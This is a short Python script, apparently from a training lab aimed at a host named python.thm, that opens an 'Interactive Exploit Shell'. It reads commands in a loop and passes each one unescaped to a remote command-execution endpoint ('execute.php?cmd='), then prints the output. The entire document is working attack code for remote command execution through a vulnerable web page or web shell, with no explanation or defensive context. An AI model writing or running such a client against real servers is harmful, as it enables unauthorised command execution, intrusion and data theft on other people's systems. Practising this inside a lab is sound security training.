import requests

# Target URL
TARGET_URL = "http://python.thm/labs/lab3/execute.php?cmd="

print("[+] Interactive Exploit Shell")
while True:
    cmd = input("Shell> ")  
    if cmd.lower() in ["exit", "quit"]:
        break
    
    response = requests.get(TARGET_URL + cmd)
    
    if response.status_code == 200:
        print(response.text)
    else:
        print("[-] Exploit failed")
